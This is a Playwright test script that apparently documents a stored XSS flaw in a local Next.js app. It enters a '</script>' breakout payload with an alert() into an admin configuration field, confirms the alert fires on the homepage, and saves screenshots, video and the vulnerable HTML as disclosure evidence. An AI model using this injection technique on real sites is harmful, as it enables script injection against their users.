import { test, expect } from '@playwright/test';

test.describe('XSS Evidence Generation', () => {
  const XSS_PAYLOAD = "</script><img src=x onerror=alert('XSS-via-beforeInteractive')>";

  test('1. Capture Admin Panel', async ({ page }) => {
    await page.goto('http://localhost:3000/admin');
    await page.screenshot({
      path: 'evidence/01-admin-panel.png',
      fullPage: true
    });
  });

  test('2. Configure XSS Payload', async ({ page }) => {
    await page.goto('http://localhost:3000/admin');

    // Enter payload
    await page.getByPlaceholder(/12345678/).fill(XSS_PAYLOAD);
    await page.screenshot({
      path: 'evidence/02-payload-entered.png',
      fullPage: true
    });

    // Submit form
    await page.getByRole('button', { name: 'Save Configuration' }).click();
  });

  test('3. Capture XSS Alert', async ({ page, context }) => {
    // Setup alert handler
    let alertFired = false;
    let alertMessage = '';

    page.on('dialog', async dialog => {
      alertFired = true;
      alertMessage = dialog.message();

      // Take screenshot before accepting alert
      await page.screenshot({
        path: 'evidence/03-xss-alert.png',
        fullPage: true
      });

      await dialog.accept();
    });

    // Navigate to homepage (triggers XSS)
    await page.goto('http://localhost:3000/');

    // Wait for alert
    await page.waitForTimeout(2000);

    // Verify alert fired
    expect(alertFired).toBe(true);
    expect(alertMessage).toContain('XSS-via-beforeInteractive');

    // Take screenshot after alert
    await page.screenshot({
      path: 'evidence/04-after-alert.png',
      fullPage: true
    });
  });

  test('4. Capture HTML Source', async ({ page }) => {
    await page.goto('http://localhost:3000/');

    // Handle alert if it appears
    page.on('dialog', async dialog => {
      await dialog.accept();
    });

    await page.waitForTimeout(1000);

    // Get full HTML source
    const html = await page.content();

    // Save to file
    const fs = require('fs');
    fs.writeFileSync('evidence/vulnerable-source.html', html);

    // Highlight vulnerable script tag
    const vulnerableLine = html.match(/self\.__next_s.*data-domain-script.*<\/script>/);
    if (vulnerableLine) {
      fs.writeFileSync(
        'evidence/vulnerable-code-snippet.txt',
        `VULNERABLE CODE IN RENDERED HTML:\n\n${vulnerableLine[0]}\n\n` +
        `This shows the XSS payload breaking out of the JSON.stringify() context.`
      );
    }
  });

  test('5. Record Video', async ({ page }) => {
    await page.goto('http://localhost:3000/admin');

    // Enter payload
    await page.getByPlaceholder(/12345678/).fill(XSS_PAYLOAD);
    await page.waitForTimeout(1000);

    // Submit
    await page.getByRole('button', { name: 'Save Configuration' }).click();
    await page.waitForURL('http://localhost:3000/');

    // Handle alert
    page.on('dialog', async dialog => {
      await page.waitForTimeout(2000); // Let alert be visible
      await dialog.accept();
    });

    await page.waitForTimeout(3000);
  });
});
